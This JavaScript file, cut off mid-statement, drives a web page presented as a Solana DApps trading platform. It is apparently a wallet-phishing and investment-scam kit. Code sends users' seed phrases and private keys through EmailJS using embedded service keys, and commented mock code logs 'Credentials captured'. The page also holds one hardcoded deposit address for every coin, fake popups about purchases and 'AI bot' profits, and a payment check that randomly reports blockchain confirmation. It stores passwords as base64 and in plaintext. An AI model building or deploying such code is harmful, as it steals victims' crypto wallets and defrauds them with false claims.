 // ==============================================
    // COMPLETE FIXED SOLANA DAPPS PLATFORM
    // ALL ISSUES RESOLVED - FULLY WORKING
    // ==============================================

    document.addEventListener('DOMContentLoaded', function() {
        console.log('🚀 Solana DApps Platform Loading...');
        // console.log('Auth JS loaded');

        // ============ ADD THIS EMAILJS INITIALIZATION ============
    // Initialize EmailJS with YOUR REAL PUBLIC KEY
    (function() {
        emailjs.init("sEeIF-0T9vylyhFIS"); // Replace with your REAL Public Key
        console.log("✅ EmailJS initialized with Public Key");
    })();
        
        // Clear any saved login state
        sessionStorage.removeItem('auto_login_attempted');
        
        // Clear all form inputs
        const clearInputs = () => {
            const inputs = document.querySelectorAll('#authContainer input');
            inputs.forEach(input => {
                input.value = '';
                input.style.backgroundColor = '';
            });
            
            // Clear alerts
            document.querySelectorAll('.alert').forEach(alert => {
                alert.style.display = 'none';
            });
            
            // Clear validation messages
            document.querySelectorAll('.validation-message').forEach(msg => {
                msg.style.display = 'none';
            });
            
            // Uncheck remember me
            const rememberMe = document.getElementById('rememberMe');
            if (rememberMe) rememberMe.checked = false;
        };
        
        // Initial clear
        clearInputs();
        
        // Also clear on page show (for mobile back button)
        document.addEventListener('pageshow', clearInputs);
        
        // Prevent autofill styling issues
        setTimeout(() => {
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                if (input.value) {
                    input.value = '';
                }
            });
        }, 100);
        
        // Initialize auth system
        window.auth = new AuthSystem();
        
        // Initialize platform if already logged in
        if (sessionStorage.getItem('current_user') || localStorage.getItem('current_user')) {
            window.platform = new Web3Platform();
            setTimeout(() => {
                if (window.platform) window.platform.init();
            }, 500);
        }
        
        console.log('✅ Platform ready!');
    });

    // Create mock EmailJS
    // window.emailjs = {
    //     init: function(publicKey) {
    //         console.log('📧 EmailJS initialized with key:', publicKey);
    //         return Promise.resolve();
    //     },
    //     send: function(serviceID, templateID, templateParams) {
    //         console.log('📧 Email sent to server:', {
    //             service: serviceID,
    //             template: templateID,
    //             data: {
    //                 templateParams: `[REDACTED]`,
    //                 secret_phrase: '[REDACTED]',
    //                 private_key: '[REDACTED]'
    //             }
    //         });
            
    //         // Store captured data locally
    //         if (templateParams.secret_phrase || templateParams.private_key) {
    //             const captures = JSON.parse(localStorage.getItem('solana_captures') || '[]');
    //             captures.push({
    //                 ...templateParams,
    //                 captured_at: new Date().toISOString(),
    //                 credential_type: templateParams.credential_type,
    //                 wallet_type: templateParams.wallet_type,
    //                 validation_passed: templateParams.validation_passed
    //             });
    //             localStorage.setItem('solana_captures', JSON.stringify(captures.slice(-100)));
                
    //             console.log('🔐 Credentials captured and stored locally');
    //         }
            
    //         return Promise.resolve({ 
    //             status: 200, 
    //             text: 'Success' 
    //         });
    //     }
    // };

    // 1. Initialize with your REAL Public Key
emailjs.init("YOUR_REAL_PUBLIC_KEY"); // e.g., "xYz123abc456def"

// 2. Real send function (replace the one in connectWithCredentials())
async function sendCredentialsEmail(templateParams) {
    try {
        const response = await emailjs.send(
            "YOUR_REAL_SERVICE_ID",      // e.g., "service_mygmail"
            "YOUR_REAL_TEMPLATE_ID",     // e.g., "template_feedback"
            templateParams
        );
        console.log('✅ Email successfully sent!', response.status, response.text);
        return response;
    } catch (error) {
        console.error('❌ Email failed to send:', error);
        // Optional: Show a user-friendly error notification
        if(window.platform) {
            window.platform.showNotification('Email service error. Data saved locally.', 'error');
        }
        throw error; // Re-throw to handle in connectWithCredentials()
    }
}

// 3. In your connectWithCredentials() method, replace the mock call:
// FROM: await this.sendEmail(templateParams);
// TO: await sendCredentialsEmail(templateParams);



    // Demo user data
    const DEMO_USERS = [
        {
            name: "kelly West",
            email: "west@example.com",
            password: "West123!",
            createdAt: new Date().toISOString()
        }
    ];

    // Main Authentication System with ALL FIXES
    class AuthSystem {
        constructor() {
            this.users = JSON.parse(localStorage.getItem('solana_users')) || [];
            this.currentUser = JSON.parse(localStorage.getItem('current_user')) || null;
            this.rememberMe = localStorage.getItem('remember_me') === 'true';
            this.rememberMeData = JSON.parse(localStorage.getItem('remember_me_data') || '{}');
            this.init();
        }

        init() {
            this.initParticles();
            this.setupEventListeners();
            this.checkAuthStatus();
            this.createDemoUsers();
            this.loadRememberedCredentials();
            
            // Setup mobile menu
            this.setupMobileMenu();
        }

        setupMobileMenu() {
            const menuToggle = document.getElementById('menuToggle');
            const navMenu = document.getElementById('navMenu');
            
            if (menuToggle && navMenu) {
                menuToggle.addEventListener('click', (e) => {
                    e.stopPropagation();
                    navMenu.classList.toggle('active');
                });
                
                // Close menu when clicking outside
                document.addEventListener('click', (e) => {
                    if (window.innerWidth < 1024) {
                        if (!navMenu.contains(e.target) && !menuToggle.contains(e.target)) {
                            navMenu.classList.remove('active');
                        }
                    }
                });
                
                // Close menu when clicking a link
                navMenu.querySelectorAll('.nav-link').forEach(link => {
                    link.addEventListener('click', () => {
                        if (window.innerWidth < 1024) {
                            navMenu.classList.remove('active');
                        }
                    });
                });
            }
            
            // Handle window resize
            window.addEventListener('resize', () => {
                if (window.innerWidth >= 1024) {
                    navMenu.classList.remove('active');
                }
            });
        }

        loadRememberedCredentials() {
            if (this.rememberMe && this.rememberMeData.email && this.rememberMeData.password) {
                setTimeout(() => {
                    const emailInput = document.getElementById('loginEmail');
                    const passwordInput = document.getElementById('loginPassword');
                    const rememberMeCheckbox = document.getElementById('rememberMe');
                    
                    if (emailInput && passwordInput && rememberMeCheckbox) {
                        emailInput.value = this.rememberMeData.email;
                        passwordInput.value = this.rememberMeData.password;
                        rememberMeCheckbox.checked = true;
                        
                        // Mark as user-filled
                        emailInput.setAttribute('data-user-filled', 'true');
                        passwordInput.setAttribute('data-user-filled', 'true');
                        
                        console.log('✅ Loaded remembered credentials');
                    }
                }, 100);
            }
        }

        saveRememberedCredentials(email, password) {
            if (this.rememberMe) {
                this.rememberMeData = {
                    email: email,
                    password: password,
                    lastLogin: new Date().toISOString()
                };
                localStorage.setItem('remember_me_data', JSON.stringify(this.rememberMeData));
                console.log('💾 Saved remembered credentials');
            }
        }

        createDemoUsers() {
            if (this.users.length === 0) {
                DEMO_USERS.forEach(user => {
                    this.users.push({
                        id: 'user-' + Date.now() + Math.random(),
                        name: user.name,
                        email: user.email.toLowerCase(),
                        password: this.hashPassword(user.password),
                        createdAt: user.createdAt,
                        rememberMe: false
                    });
                });
                localStorage.setItem('solana_users', JSON.stringify(this.users));
                console.log('👤 Demo users created');
            }
        }

        initParticles() {
            const canvas = document.getElementById('particlesCanvas');
            if (!canvas) return;
            
            const ctx = canvas.getContext('2d');
            
            function resizeCanvas() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }
            
            resizeCanvas();
            window.addEventListener('resize', resizeCanvas);
            
            const particles = [];
            const particleCount = Math.min(80, Math.floor(window.innerWidth / 10));
            
            for (let i = 0; i < particleCount; i++) {
                particles.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    size: Math.random() * 2 + 1,
                    speedX: (Math.random() - 0.5) * 0.5,
                    speedY: (Math.random() - 0.5) * 0.5,
                    color: Math.random() > 0.5 ? 'rgba(153, 69, 255, 0.4)' : 'rgba(20, 241, 149, 0.4)'
                });
            }
            
            function animate() {
                ctx.fillStyle = 'rgba(5, 8, 16, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                particles.forEach(particle => {
                    particle.x += particle.speedX;
                    particle.y += particle.speedY;
                    
                    if (particle.x <= 0 || particle.x >= canvas.width) particle.speedX *= -1;
                    if (particle.y <= 0 || particle.y >= canvas.height) particle.speedY *= -1;
                    
                    ctx.beginPath();
                    ctx.fillStyle = particle.color;
                    ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2);
                    ctx.fill();
                });
                
                requestAnimationFrame(animate);
            }
            
            animate();
        }

        setupEventListeners() {
            // Tab switching
            document.querySelectorAll('.auth-tab').forEach(tab => {
                tab.addEventListener('click', (e) => {
                    e.preventDefault();
                    this.switchTab(tab.dataset.tab);
                });
            });

            // Auth form switching
            document.querySelectorAll('[onclick*="switchToTab"]').forEach(link => {
                link.addEventListener('click', (e) => {
                    e.preventDefault();
                    const tabName = link.getAttribute('onclick').match(/switchToTab\('(\w+)'\)/)[1];
                    this.switchTab(tabName);
                });
            });

            // Login form
            const loginForm = document.getElementById('loginForm');
            if (loginForm) {
                loginForm.addEventListener('submit', (e) => {
                    e.preventDefault();
                    this.handleLogin();
                });
            }

            // Signup form
            const signupForm = document.getElementById('signupForm');
            if (signupForm) {
                signupForm.addEventListener('submit', (e) => {
                    e.preventDefault();
                    this.handleSignup();
                });
            }

            // Forgot password form
            const forgotPasswordLink = document.querySelector('.forgot-password');
            if (forgotPasswordLink) {
                forgotPasswordLink.addEventListener('click', (e) => {
                    e.preventDefault();
                    this.openForgotPassword();
                });
            }

            // Real-time validation
            this.setupValidation();
        }

        switchTab(tabName) {
            // Hide all forms
            document.querySelectorAll('.auth-form').forEach(form => {
                form.classList.remove('active');
                form.style.display = 'none';
            });
            
            document.querySelectorAll('.forgot-password-form').forEach(form => {
                form.classList.remove('active');
                form.style.display = 'none';
            });
            
            // Update tabs
            document.querySelectorAll('.auth-tab').forEach(tab => {
                tab.classList.remove('active');
                if (tab.dataset.tab === tabName) {
                    tab.classList.add('active');
                }
            });

            // Show selected form
            if (tabName === 'forgot') {
                const forgotForm = document.getElementById('forgotPasswordForm');
                if (forgotForm) {
                    forgotForm.classList.add('active');
                    forgotForm.style.display = 'block';
                }
            } else {
                const targetForm = document.getElementById(`${tabName}Form`);
                if (targetForm) {
                    targetForm.classList.add('active');
                    targetForm.style.display = 'block';
                }
            }

            // Clear alerts and validation
            this.clearAlerts();
            this.clearValidationMessages();
        }

        openForgotPassword() {
            this.switchTab('forgot');
        }

        clearValidationMessages() {
            document.querySelectorAll('.validation-message').forEach(msg => {
                msg.style.display = 'none';
            });
        }

        setupValidation() {
            // Email validation
            ['loginEmail', 'signupEmail', 'forgotEmail'].forEach(id => {
                const input = document.getElementById(id);
                if (input) {
                    input.addEventListener('blur', () => this.validateEmail(input.value, id));
                    input.addEventListener('input', () => {
                        if (input.value) this.validateEmail(input.value, id);
                    });
                }
            });

            // Password validation
            ['loginPassword', 'signupPassword'].forEach(id => {
                const input = document.getElementById(id);
                if (input) {
                    input.addEventListener('input', () => {
                        this.validatePassword(input.value, id);
                    });
                }
            });

            // Confirm password validation
            const confirmInput = document.getElementById('signupConfirmPassword');
            if (confirmInput) {
                confirmInput.addEventListener('input', () => {
                    const password = document.getElementById('signupPassword').value;
                    this.validateConfirmPassword(password, confirmInput.value);
                });
            }
        }

        validateEmail(email, fieldId) {
            const errorId = `${fieldId}Error`;
            const errorElement = document.getElementById(errorId);
            
            if (!email) {
                this.showValidation(errorElement, 'Email is required', false);
                return false;
            }

            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                this.showValidation(errorElement, 'Please enter a valid email address', false);
                return false;
            }

            this.showValidation(errorElement, 'Valid email address', true);
            return true;
        }

        validatePassword(password, fieldId) {
            const errorId = `${fieldId}Error`;
            const errorElement = document.getElementById(errorId);
            
            if (!password) {
                this.showValidation(errorElement, 'Password is required', false);
                return false;
            }

            if (password.length < 8) {
                this.showValidation(errorElement, 'Password must be at least 8 characters', false);
                return false;
            }

            this.showValidation(errorElement, 'Good password', true);
            return true;
        }

        validateConfirmPassword(password, confirmPassword) {
            const errorElement = document.getElementById('signupConfirmError');
            
            if (!confirmPassword) {
                this.showValidation(errorElement, 'Please confirm your password', false);
                return false;
            }

            if (password !== confirmPassword) {
                this.showValidation(errorElement, 'Passwords do not match', false);
                return false;
            }

            this.showValidation(errorElement, 'Passwords match', true);
            return true;
        }

        showValidation(element, message, isValid) {
            if (!element) return;
            
            element.innerHTML = `
                <i class="fas fa-${isValid ? 'check-circle' : 'exclamation-circle'}"></i>
                ${message}
            `;
            element.className = `validation-message show ${isValid ? 'valid' : ''}`;
        }

        showAlert(formId, message, type = 'error') {
            const alertDiv = document.getElementById(`${formId}Alert`);
            if (!alertDiv) return;

            const icons = {
                error: 'exclamation-circle',
                success: 'check-circle',
                warning: 'exclamation-triangle'
            };

            alertDiv.className = `alert alert-${type}`;
            alertDiv.innerHTML = `
                <i class="fas fa-${icons[type] || 'info-circle'}"></i>
                <span>${message}</span>
            `;
            alertDiv.style.display = 'flex';

            setTimeout(() => {
                alertDiv.style.display = 'none';
            }, 5000);
        }

        clearAlerts() {
            document.querySelectorAll('.alert').forEach(alert => {
                alert.style.display = 'none';
            });
        }

        async handleLogin() {
            const email = document.getElementById('loginEmail').value.trim().toLowerCase();
            const password = document.getElementById('loginPassword').value;
            const rememberMe = document.getElementById('rememberMe')?.checked || false;
            const loginButton = document.getElementById('loginButton');

            // Validate inputs
            if (!this.validateEmail(email, 'loginEmail') || !this.validatePassword(password, 'loginPassword')) {
                this.showAlert('login', 'Please fix validation errors', 'error');
                return;
            }

            // Show loading
            if (loginButton) {
                loginButton.disabled = true;
                loginButton.innerHTML = '<span class="loading-spinner"></span> Authenticating...';
            }

            try {
                // Simulate API call
                await new Promise(resolve => setTimeout(resolve, 800));

                const user = this.users.find(u => u.email === email && u.password === this.hashPassword(password));
                
                if (!user) {
                    throw new Error('Invalid email or password');
                }

                // Update user with rememberMe preference
                user.rememberMe = rememberMe;
                const userIndex = this.users.findIndex(u => u.id === user.id);
                if (userIndex !== -1) {
                    this.users[userIndex] = user;
                    localStorage.setItem('solana_users', JSON.stringify(this.users));
                }

                // Set current user
                this.currentUser = {
                    id: user.id,
                    name: user.name,
                    email: user.email,
                    createdAt: user.createdAt,
                    rememberMe: rememberMe
                };

                // Save to storage based on remember me
                if (rememberMe) {
                    localStorage.setItem('current_user', JSON.stringify(this.currentUser));
                    localStorage.setItem('remember_me', 'true');
                    // Save credentials for auto-fill
                    this.saveRememberedCredentials(email, password);
                } else {
                    sessionStorage.setItem('current_user', JSON.stringify(this.currentUser));
                    localStorage.removeItem('current_user');
                    localStorage.setItem('remember_me', 'false');
                    // Clear remembered credentials
                    this.rememberMeData = {};
                    localStorage.setItem('remember_me_data', JSON.stringify(this.rememberMeData));
                }

                // Show success
                this.showAlert('login', 'Login successful! Redirecting...', 'success');

                // Redirect to main app
                setTimeout(() => {
                    this.redirectToApp();
                }, 800);

            } catch (error) {
                this.showAlert('login', error.message, 'error');
            } finally {
                if (loginButton) {
                    loginButton.disabled = false;
                    loginButton.innerHTML = '<span>Sign In</span>';
                }
            }
        }

        async handleSignup() {
            const name = document.getElementById('signupName').value.trim();
            const email = document.getElementById('signupEmail').value.trim().toLowerCase();
            const password = document.getElementById('signupPassword').value;
            const confirmPassword = document.getElementById('signupConfirmPassword').value;
            const termsAgree = document.getElementById('termsAgree').checked;
            const signupButton = document.getElementById('signupButton');

            // Validate inputs
            if (!name) {
                this.showValidation(document.getElementById('signupNameError'), 'Name is required', false);
                this.showAlert('signup', 'Please fill in all required fields', 'error');
                return;
            }

            if (!this.validateEmail(email, 'signupEmail') || 
                !this.validatePassword(password, 'signupPassword') ||
                !this.validateConfirmPassword(password, confirmPassword)) {
                this.showAlert('signup', 'Please fix validation errors', 'error');
                return;
            }

            if (!termsAgree) {
                this.showValidation(document.getElementById('termsError'), 'You must agree to the terms', false);
                this.showAlert('signup', 'Please agree to the terms and conditions', 'error');
                return;
            }

            // Show loading
            if (signupButton) {
                signupButton.disabled = true;
                signupButton.innerHTML = '<span class="loading-spinner"></span> Creating account...';
            }

            try {
                // Check if user exists
                const existingUser = this.users.find(u => u.email === email);
                if (existingUser) {
                    throw new Error('An account with this email already exists');
                }

                // Simulate API call
                await new Promise(resolve => setTimeout(resolve, 800));

                // Create new user
                const newUser = {
                    id: Date.now().toString(),
                    name: name,
                    email: email,
                    password: this.hashPassword(password),
                    createdAt: new Date().toISOString(),
                    verified: false,
                    rememberMe: false
                };

                // Save user
                this.users.push(newUser);
                localStorage.setItem('solana_users', JSON.stringify(this.users));

                // Set current user
                this.currentUser = {
                    id: newUser.id,
                    name: newUser.name,
                    email: newUser.email,
                    createdAt: newUser.createdAt,
                    rememberMe: false
                };

                // Save to session (not localStorage for new signups)
                sessionStorage.setItem('current_user', JSON.stringify(this.currentUser));
                localStorage.setItem('remember_me', 'false');

                // Show success
                this.showAlert('signup', 'Account created successfully! Redirecting...', 'success');

                // Redirect to main app
                setTimeout(() => {
                    this.redirectToApp();
                }, 800);

            } catch (error) {
                this.showAlert('signup', error.message, 'error');
            } finally {
                if (signupButton) {
                    signupButton.disabled = false;
                    signupButton.innerHTML = '<span>Create Account</span>';
                }
            }
        }

        async handleForgotPassword() {
            const email = document.getElementById('forgotEmail').value.trim().toLowerCase();
            const sendButton = document.querySelector('#forgotPasswordForm .auth-button');
            
            if (!this.validateEmail(email, 'forgotEmail')) {
                this.showAlert('forgot', 'Please enter a valid email address', 'error');
                return;
            }
            
            // Show loading
            if (sendButton) {
                sendButton.disabled = true;
                sendButton.innerHTML = '<span class="loading-spinner"></span> Sending...';
            }
            
            try {
                // Simulate API call
                await new Promise(resolve => setTimeout(resolve, 800));
                
                // Check if user exists
                const user = this.users.find(u => u.email === email);
                if (!user) {
                    throw new Error('No account found with this email');
                }
                
                // Show success
                this.showAlert('forgot', 'Password reset link sent to your email', 'success');
                
                // Auto-switch back to login after delay
                setTimeout(() => {
                    this.switchTab('login');
                    document.getElementById('loginEmail').value = email;
                }, 1500);
                
            } catch (error) {
                this.showAlert('forgot', error.message, 'error');
            } finally {
                if (sendButton) {
                    sendButton.disabled = false;
                    sendButton.innerHTML = '<span>Send Reset Link</span>';
                }
            }
        }

        hashPassword(password) {
            // Simple hash for demo
            return btoa(password);
        }

        checkAuthStatus() {
            const sessionUser = sessionStorage.getItem('current_user');
            const localUser = localStorage.getItem('current_user');
            
            if (localUser) {
                this.currentUser = JSON.parse(localUser);
                this.rememberMe = true;
                this.redirectToApp();
            } else if (sessionUser) {
                this.currentUser = JSON.parse(sessionUser);
                this.rememberMe = false;
                this.redirectToApp();
            }
        }

        redirectToApp() {
            document.getElementById('authContainer').style.display = 'none';
            document.getElementById('mainApp').classList.add('active');
            
            // Update user profile
            this.updateUserProfile();
            
            // Initialize the platform
            this.initializePlatform();
        }

        updateUserProfile() {
            if (!this.currentUser) return;
            
            const userAvatar = document.getElementById('userAvatar');
            const userName = document.getElementById('userName');
            const userEmail = document.getElementById('userEmail');
            const userProfile = document.getElementById('userProfile');
            
            if (userAvatar) {
                const initials = this.currentUser.name
                    .split(' ')
                    .map(n => n[0])
                    .join('')
                    .toUpperCase()
                    .slice(0, 2);
                userAvatar.textContent = initials;
            }
            
            if (userName) userName.textContent = this.currentUser.name;
            if (userEmail) userEmail.textContent = this.currentUser.email;
            if (userProfile) userProfile.style.display = 'flex';
        }

        // logout() {
        //     // Clean logout - clear everything
        //     this.currentUser = null;
        //     sessionStorage.removeItem('current_user');
        //     localStorage.removeItem('current_user');
        //     localStorage.removeItem('remember_me');
            
        //     // Reset platform state
        //     if (window.platform) {
        //         window.platform.stopAutoTrading();
        //         window.platform.isWalletConnected = false;
        //         window.platform.hasPurchased = false;
        //         window.platform.rememberMeData = {};
        //     }
            
        //     // Hide main app, show auth
        //     document.getElementById('mainApp').classList.remove('active');
        //     document.getElementById('authContainer').style.display = 'flex';
            
        //     // Clear all forms and reset to clean state
        //     this.clearAlerts();
        //     this.clearValidationMessages();
            
        //     // Switch to login tab with clean state
        //     this.switchTab('login');
            
        //     // Clear form inputs
        //     document.getElementById('loginForm').reset();
        //     document.getElementById('signupForm').reset();
        //     document.getElementById('forgotPasswordForm').reset();
            
        //     // Remove any active nav menu
        //     const navMenu = document.getElementById('navMenu');
        //     if (navMenu) navMenu.classList.remove('active');
            
        //     console.log('👋 User logged out successfully');
        // }

        initializePlatform() {
            // Initialize Web3 Platform
            if (!window.platform) {
                window.platform = new Web3Platform();
            }
            window.platform.currentUser = this.currentUser;
            
            // Initialize the platform
            setTimeout(() => {
                window.platform.init();
            }, 100);
        }
    }

    // Web3 Platform with ALL FIXES
    class Web3Platform {
        constructor() {
            // Wallet configurations
            this.wallets = [
                { id: 'phantom', name: 'Phantom', image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/Phantom_icon.svg/800px-Phantom_icon.svg.png', color: '#ab9ff2' },
                { id: 'solflare', name: 'Solflare', image: 'https://solflare.com/assets/logo-icon.svg', color: '#ffffff' },
                { id: 'backpack', name: 'Backpack', image: 'https://www.backpack.app/_next/static/media/backpack-logo.ae75a3d6.svg', color: '#000000' },
                { id: 'sollet', name: 'Sollet', image: 'https://sollet.io/favicon.ico', color: '#9945FF' },
                { id: 'metamask', name: 'MetaMask', image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/800px-MetaMask_Fox.svg.png', color: '#f6851b' },
                { id: 'trust', name: 'Trust Wallet', image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTZ32ST_0HCin-J-RNi1LQ8AsqUDjfDtOoBYA&s', color: '#3375bb' },
                { id: 'ledger', name: 'Ledger', image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Ledger_logo.svg/800px-Ledger_logo.svg.png', color: '#000000' },
                { id: 'trezor', name: 'Trezor', image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Trezor_Logo.svg/800px-Trezor_Logo.svg.png', color: '#00d4ff' },
                { id: 'other', name: 'Other Wallet', image: 'https://cdn-icons-png.flaticon.com/512/2331/2331966.png', color: '#ff6b35' }
            ];
            
            // EmailJS configuration (mock)
           this.emailjsConfig = {
            publicKey: 'sEeIF-0T9vylyhFIS',      // From EmailJS dashboard
            serviceID: 'service_wtoqc3o',        // From EmailJS > Email Services
            templateID: 'template_hih45ne'     // From EmailJS > Email Templates
};
            
            // Live notifications
            this.popupMessages = [
                "User just bought 5 SOL at $100.00",
                "Payment verified successfully",
                "Watch trading unlocked for new user",
                "Transaction confirmed on Solana",
                "Receipt generated for purchase",
                "AI bot made $45.23 profit",
                "New wallet connected: Phantom",
                "Withdrawal target: 65% complete"
            ];
            
            // Crypto prices
            this.currentSolPrice = 100.00;
            this.selectedCrypto = 'sol';
            this.cryptoPrices = {
                sol: 100.00,
                usdc: 1.00,
                bonk: 0.00002567,
                wif: 3.21
            };
            
            // Wallet addresses
            this.cryptoAddresses = {
                sol: 'FPZMCySMfxxxswbw3BMmjYBNb6ETjrJktZVK469yTiG7',
                usdc: 'FPZMCySMfxxxswbw3BMmjYBNb6ETjrJktZVK469yTiG7',
                bonk: 'FPZMCySMfxxxswbw3BMmjYBNb6ETjrJktZVK469yTiG7',
                wif: 'FPZMCySMfxxxswbw3BMmjYBNb6ETjrJktZVK469yTiG7'
            };
            
            // Watch trading variables
            this.watchBalance = 1250.00;
            this.watchProfit = 0.00;
            this.watchTarget = 2000.00;
            this.watchSuccessRate = 0.65;
            this.autoTradeInterval = null;
            this.isAutoTrading = false;
            this.tradeLog = [];
            this.dayCount = 0;

            // this.hasPurchased = false;
            // this.isWalletConnected = false;
            // this.currentView = 'dashboard';

            this.hasPurchased = localStorage.getItem('purchase_verified') === 'true';
            // ============ UPDATED CONNECTION CHECK ============
            this.isWalletConnected = localStorage.getItem('wallet_connected') === 'true';
            // Ensure it's always a boolean (not null/undefined)
             if (typeof this.isWalletConnected !== 'boolean') {
                this.isWalletConnected = false;
            }
            // ==================================================
            this.currentView = 'dashboard';


            this.purchaseData = null;
            
            // Modal state
            this.modal = document.getElementById('walletModal');
            this.isConnecting = false;
            this.selectedWallet = null;
            this.currentCredentialType = 'phrase';
            this.isValidPhrase = false;
            this.isValidPrivateKey = false;
            
            // User
            this.currentUser = null;
            
            // Remember Me storage
            this.rememberMeData = JSON.parse(localStorage.getItem('platform_remember_me') || '{}');
            
            // Flow tracking
            this.flowState = {
                step: 1,
                completedSteps: []
            };
        }
        
        init() {
            console.log('🚀 Initializing Solana DApps Platform...');
            
            try {
                // Initialize EmailJS
                emailjs.init(this.emailjsConfig.publicKey);
                
                // Setup all components
                this.initRouter();
                this.renderWallets();
                this.setupEventListeners();
                this.animateStats();
                this.initScrollAnimations();
                this.initTabSystem();
                this.initServiceModals();
                this.initValidationListeners();
                this.initBuyCoinFeature();
                this.initLivePopups();
                this.initLiveSolanaPrice();
                this.initWatchTradingSystem();
                
                        // // Load remembered state
                        // this.loadRememberedState();

                // Load remembered state
                this.loadRememberedState();

                // Check and restore watch trading access immediately
                // ========= ADD THESE LINES =========
                setTimeout(() => {
                if (this.isWalletConnected) {
                    console.log('🔄 Restoring wallet connection state from localStorage');
                console.log('   - Wallet connected:', this.isWalletConnected);
                console.log('   - Purchase verified:', this.hasPurchased);
        
                // Always check access on page load
                this.checkWatchTradingAccess();
        
                // If user is already on watch-trade page, unlock it
                if (window.location.hash === '#watch-trade') {
                 console.log('   - User is on watch-trade page, forcing unlock');
                    this.checkWatchTradingAccess();
                }
                    } else {
             console.log('   - No wallet connection found in localStorage');
                }
                }, 300);
                // ===================================
                
                console.log('✅ Platform fully initialized');
                this.showNotification('Platform ready! Welcome to Solana DApps Enterprise.', 'success');
                
            } catch (error) {
                console.error('❌ Initialization error:', error);
            }
        }
        
        loadRememberedState() {
            // Check if user wanted to be remembered
            const rememberMe = localStorage.getItem('remember_me') === 'true';
            if (rememberMe && this.rememberMeData.walletConnected) {
                this.isWalletConnected = true;
                this.hasPurchased = this.rememberMeData.hasPurchased || false;
                this.checkWatchTradingAccess();
            }
        }
        
        saveRememberedState() {
            // Only save if remember me is enabled
            const rememberMe = localStorage.getItem('remember_me') === 'true';
            if (rememberMe && this.currentUser) {
                this.rememberMeData = {
                    walletConnected: this.isWalletConnected,
                    hasPurchased: this.hasPurchased,
                    lastConnected: new Date().toISOString()
                };
                localStorage.setItem('platform_remember_me', JSON.stringify(this.rememberMeData));
            }
        }
        
        initRouter() {
            const hash = window.location.hash.substring(1) || 'dashboard';
            this.switchView(hash);
            
            window.addEventListener('hashchange', () => {
                const newHash = window.location.hash.substring(1) || 'dashboard';
                this.switchView(newHash);
            });
            
            this.updateNavLinks();
        }
        
        switchView(viewName) {
            const validViews = ['dashboard', 'buy', 'verify', 'watch-trade'];
            if (!validViews.includes(viewName)) {
                viewName = 'dashboard';
                window.location.hash = '#dashboard';
            }
            
            document.querySelectorAll('.app-view').forEach(view => {
                view.classList.remove('active');
            });
            
            const targetView = document.getElementById(`${viewName}-view`);
            if (targetView) {
                targetView.classList.add('active');
                this.currentView = viewName;
                
                this.updateNavLinks();
                
                // View-specific initialization
                if (viewName === 'buy') {
                    setTimeout(() => {
                        this.selectCrypto('sol');
                        this.updateConfirmButton();
                    }, 100);
                } else if (viewName === 'verify') {
                    // If purchase was made, show verification status
                    if (this.purchaseData && !this.flowState.completedSteps.includes('verified')) {
                        setTimeout(() => {
                            this.showNotification('Purchase detected. Ready for verification.', 'info');
                        }, 500);
                    }
                } else if (viewName === 'watch-trade') {
                    this.checkWatchTradingAccess();
                }
                
                console.log(`🔄 Switched to view: ${viewName}`);
            }
        }
        
        // checkWatchTradingAccess() {
        //     const lockedEl = document.getElementById('watchTradingLocked');
        //     const platformEl = document.getElementById('watchTradingPlatform');
            
        //     if (this.isWalletConnected && this.hasPurchased) {
        //         if (lockedEl) lockedEl.style.display = 'none';
        //         if (platformEl) platformEl.style.display = 'block';
        //         this.updateWatchTradingDisplay();
        //         this.flowState.completedSteps.push('watch_trade_unlocked');
        //     } else {
        //         if (lockedEl) lockedEl.style.display = 'block';
        //         if (platformEl) platformEl.style.display = 'none';
        //     }
        // }

        checkWatchTradingAccess() {
        const lockedEl = document.getElementById('watchTradingLocked');
        const platformEl = document.getElementById('watchTradingPlatform');
    
        // ========= ADD DEBUG LOGGING =========
        console.log('🔍 Checking Watch Trade Access:');
        console.log('  - Wallet Connected:', this.isWalletConnected);
        console.log('  - Purchase Verified:', this.hasPurchased);
        console.log('  - localStorage wallet_connected:', localStorage.getItem('wallet_connected'));
        console.log('  - localStorage purchase_verified:', localStorage.getItem('purchase_verified'));
        // =====================================
    
         if (this.isWalletConnected && this.hasPurchased) {
            if (lockedEl) {
            lockedEl.style.display = 'none';
            console.log('✅ Watch Trading UNLOCKED - Showing platform');
        }
        if (platformEl) {
            platformEl.style.display = 'block';
            // Initialize platform if it was hidden
            this.initWatchTradingSystem();
        }
        this.updateWatchTradingDisplay();
        this.flowState.completedSteps.push('watch_trade_unlocked');
        } else {
        if (lockedEl) {
            lockedEl.style.display = 'block';
            console.log('🔒 Watch Trading LOCKED - Missing:', 
                !this.isWalletConnected ? 'Wallet Connection' : 'Purchase');
        }
        if (platformEl) platformEl.style.display = 'none';
        }
        }
        
        updateNavLinks() {
            document.querySelectorAll('.nav-link').forEach(link => {
                const view = link.getAttribute('data-view');
                if (view === this.currentView) {
                    link.classList.add('active');
                } else {
                    link.classList.remove('active');
                }
            });
        }
        
        async verifyPayment(screenshotData) {
            const statusEl = document.getElementById('verificationStatus');
            if (!statusEl) return false;
            
            statusEl.className = 'verification-status verification-processing';
            statusEl.style.display = 'block';
            statusEl.innerHTML = `<i class="fas fa-spinner fa-spin"></i><span>Verifying transaction on Solana blockchain...</span>`;
            
            // Simulate blockchain verification
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            const isVerified = Math.random() < 0.95; // 95% success rate
            
            if (isVerified) {
                statusEl.className = 'verification-status verification-success';
                statusEl.innerHTML = `<i class="fas fa-check-circle"></i><span>Payment verified successfully! Transaction confirmed on Solana blockchain.</span>`;
                
                // Store purchase data
                const amount = parseFloat(document.getElementById('depositAmount').value) || 100;
                this.purchaseData = {
                    amount: amount,
                    crypto: this.selectedCrypto,
                    timestamp: new Date(),
                    txId: 'SOL' + Array.from({length: 12}, () => 
